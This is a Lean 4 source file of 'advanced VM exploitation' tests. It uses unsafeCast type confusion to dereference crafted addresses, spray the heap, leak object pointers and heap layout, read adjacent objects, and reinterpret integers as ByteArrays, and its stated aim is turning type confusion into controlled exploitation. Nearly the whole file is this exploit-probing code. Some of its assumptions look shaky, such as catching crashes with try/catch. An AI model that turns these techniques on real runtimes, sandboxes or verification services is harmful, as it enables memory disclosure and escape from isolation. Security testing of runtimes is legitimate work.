-- Advanced VM Exploitation: Heap Spray for Controlled Crash
-- Goal: Control the crash address by crafting specific Nat values

import Lean

-- Test 1: Try to read memory by crafting a "pointer" value
unsafe def test_controlled_pointer : IO Unit := do
  IO.println "[Advanced] Attempting controlled pointer dereference"

  -- Craft Nat that when interpreted as pointer might hit readable memory
  -- Try stack address-like value (high address on 64-bit)
  let fake_ptr_nat : Nat := 0x7fff00000000  -- Typical stack address range
  let fake_string : String := unsafeCast fake_ptr_nat

  IO.println "Attempting to read from crafted address..."
  try
    -- This might crash, but where?
    let len := fake_string.length
    IO.println s!"Length: {len} (UNEXPECTED - memory read succeeded!)"
  catch e =>
    IO.println s!"Caught: {e}"

-- Test 2: Heap spray - allocate many objects to control memory layout
unsafe def heap_spray : IO Unit := do
  IO.println "[Advanced] Heap spraying to control memory layout"

  -- Allocate many strings in a pattern
  let mut objects : Array String := #[]
  for i in [0:1000] do
    objects := objects.push s!"AAAAAAAAAAAAAAAA_{i}"

  IO.println s!"Allocated {objects.size} objects"

  -- Now create a Nat that might point into our spray
  let spray_target : Nat := 0x100000000  -- 4GB mark - typical heap region
  let fake_string : String := unsafeCast spray_target

  try
    let c := fake_string.get! 0  -- Try to read first character
    IO.println s!"Read character: {c} (UNEXPECTED SUCCESS)"
  catch e =>
    IO.println s!"Crash as expected"

-- Test 3: Information disclosure - can we read Lean object headers?
unsafe def test_info_disclosure : IO Unit := do
  IO.println "[Advanced] Attempting information disclosure"

  -- Create a real string
  let real_string := "SECRET_DATA_IN_MEMORY"

  -- Try to cast it to Nat to see its representation
  let string_as_nat : Nat := unsafeCast real_string
  IO.println s!"String as Nat: {string_as_nat} (object pointer/representation)"

  -- Create another string nearby
  let another := "ANOTHER_SECRET"
  let another_as_nat : Nat := unsafeCast another
  IO.println s!"Another as Nat: {another_as_nat}"

  -- Difference might reveal heap layout
  let diff := if string_as_nat > another_as_nat
              then string_as_nat - another_as_nat
              else another_as_nat - string_as_nat
  IO.println s!"Heap distance: {diff} (reveals object size/layout)"

-- Test 4: Can we craft an integer that reads adjacent objects?
unsafe def test_adjacent_read : IO Unit := do
  IO.println "[Advanced] Attempting to read adjacent heap objects"

  -- Allocate an array with sensitive data
  let sensitive : Array Nat := #[0xDEADBEEF, 0xCAFEBABE, 0x13371337]

  -- Get its address as Nat
  let array_addr : Nat := unsafeCast sensitive
  IO.println s!"Array address: {array_addr}"

  -- Try to read slightly past it by adding offset
  let offset_addr := array_addr + 64  -- Typical object size
  let fake_array : Array Nat := unsafeCast offset_addr

  try
    if fake_array.size > 0 then
      IO.println s!"Adjacent object size: {fake_array.size}"
      let val := fake_array[0]!
      IO.println s!"Adjacent value: {val} (heap info leak!)"
  catch e =>
    IO.println s!"Crash reading adjacent object"

-- Test 5: Use ByteArray for more controlled memory access
unsafe def test_bytearray_confusion : IO Unit := do
  IO.println "[Advanced] ByteArray type confusion"

  -- Create a ByteArray with known pattern
  let bytes : ByteArray := ByteArray.mk #[0x41, 0x41, 0x41, 0x41, 0x42, 0x42, 0x42, 0x42]

  -- Cast to UInt64 - this should reinterpret the bytes
  let as_u64 : UInt64 := unsafeCast bytes
  IO.println s!"ByteArray as UInt64: 0x{as_u64.toNat.toUInt64}"

  -- Can we use this to read arbitrary memory by crafting ByteArray?
  let malicious_addr : UInt64 := 0x100000000
  let fake_bytes : ByteArray := unsafeCast malicious_addr

  try
    if fake_bytes.size > 0 then
      IO.println s!"Fake ByteArray size: {fake_bytes.size}"
      let byte := fake_bytes.get! 0
      IO.println s!"First byte: {byte} (MEMORY READ!)"
  catch e =>
    IO.println s!"Crash on memory read"

unsafe def main : IO Unit := do
  IO.println "=== Advanced VM Exploitation Tests ==="
  IO.println "Goal: Turn type confusion into controlled exploitation\n"

  IO.println "[Test 1] Controlled pointer dereference:"
  try test_controlled_pointer catch _ => IO.println "Crashed"

  IO.println "\n[Test 2] Heap spraying:"
  try heap_spray catch _ => IO.println "Crashed"

  IO.println "\n[Test 3] Information disclosure:"
  try test_info_disclosure catch _ => IO.println "Crashed"

  IO.println "\n[Test 4] Adjacent object read:"
  try test_adjacent_read catch _ => IO.println "Crashed"

  IO.println "\n[Test 5] ByteArray confusion:"
  try test_bytearray_confusion catch _ => IO.println "Crashed"
